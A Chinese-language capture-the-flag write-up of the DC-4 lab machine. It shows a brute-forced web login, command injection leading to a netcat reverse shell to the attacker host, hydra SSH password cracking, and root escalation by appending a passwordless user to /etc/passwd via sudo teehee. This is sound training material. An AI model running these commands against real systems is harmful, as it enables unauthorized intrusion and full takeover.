
# 0x00环境

攻击机：kali（192.168.1.28）

靶机：DC-4（192.168.1.12）


# 0x01实战


## 端口扫描

```
nmap -sV -A -p- 192.168.1.12
```

![image-20220111094642715.png](./assets/1652256328235-3a48ced6-cb03-4105-9180-1a8eb3cf434f.png)

可以看到开放了22号端口SSH服务和80端口HTTP服务

访问HTTP服务，是一个登录页面

![image-20220111094804504.png](./assets/1652256333137-640078ab-7043-44a7-81d1-ae18130ccf4f.png)

查看网页源码，没什么卵用

![image-20220111094904759.png](./assets/1652256336615-fe3968c0-5669-46f3-b1b3-9f609660a732.png)


## 目录扫描

并没有什么有用的信息

![image-20220111095500468.png](./assets/1652256340086-eb549f2f-62f8-4aa6-8a14-0d17a0b00b0c.png)


## 暴力破解

输入账户admin任意密码，使用burpsuite抓包进行爆破

![image-20220111100742650.png](./assets/1652256343257-ea434143-8694-4194-a397-61d8ba0b0feb.png)

爆破出密码为happy


## 漏洞发现

登录系统后发发现是一个可以执行系统命令的页面

![image-20220111100919355.png](./assets/1652256347511-7b40f9f4-964e-4c22-ae17-76c472859fd9.png)

尝试使用burpsuite抓包修改命令来实现SRC

![image-20220111101149990.png](./assets/1652256351029-10171776-c668-4f7a-b465-d0cac5742f68.png)

可以执行任意命令，尝试使用nc反弹shell


## 漏洞利用

设置监听

```
nc -vnlp 1234
```

![image-20220111101549464.png](./assets/1652256355137-947753d1-5d30-473d-a762-a47eabbfa5c8.png)

使用NC反弹shell

```
nc 192.168.1.28 1234 -e /bin/bash
```

![image-20220111101918954.png](./assets/1652256359009-7761984f-4a09-48e8-991b-d92724b78a86.png)

成功反弹

![image-20220111102027031.png](./assets/1652256363338-f4f0261a-b2c5-4d49-8e25-19232ea328c0.png)

查看/etc/passwd文件

![image-20220111113446593.png](./assets/1652256366494-bd87be74-6feb-4e06-bb60-695a3329da02.png)

在jim目录下的backups目录中发现字典文件old-passwords.bak

![image-20220111113740020.png](./assets/1652256370547-b1fb822d-221f-4dd4-88fa-a223a927d8bc.png)

将字典文件保存下来使用hydra进行爆破

```
hydra -l jim -P password.txt ssh://192.168.1.12
```

![image-20220111114918220.png](./assets/1652256376049-fdaf69dc-538b-48bc-90cc-0e6ac951adf0.png)

得到jim的密码jibril04

使用jim账号登录

```
ssh jim@192.168.1.12
```

![image-20220111115213797.png](./assets/1652256381354-a268e7be-9a38-4593-ac36-c56f9d94a490.png)

查看jim目录下的mbox文件可以发现在2019年4月6日星期六20:20:04，收到了一封来自root的邮件

![image-20220111115736723.png](./assets/1652256384722-6856bf5a-912c-49cf-be36-fa6883ae4973.png)

查看该邮件

![image-20220111115935335.png](./assets/1652256388080-d4472441-99c6-4cdf-a24f-cbe08fbefc56.png)

在邮件中我们得到了一个用户密码charles/^xHhA&hvim0y

登录charle并查看scharles的sudo权限

![image-20220111120240351.png](./assets/1652256391926-427fbb06-2a5b-44f0-ba00-cc524198a87d.png)

显示我们可以以root权限运行teehee命令

![image-20220111120535688.png](./assets/1652256395862-fce2f126-c4f7-4c79-a4bf-5044adabac4d.png)

tee命令用于读取标准输入的数据，并将其内容输出成文件。在这里我们是root权限，所以我们可以给所有文件随意添加内容。


## 提权

向/etc/passwd中写入一个拥有root权限的用户
```
echo "XMTX::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

![image-20220111135359205.png](./assets/1652256399016-4c74cdbf-c51a-4a15-8db6-7e3670893ee7.png)


## final-flag

在root根目录下找到flag

![image-20220111135511524.png](./assets/1652256402114-664d07a2-0feb-4487-bc6c-c3d4166f083a.png)
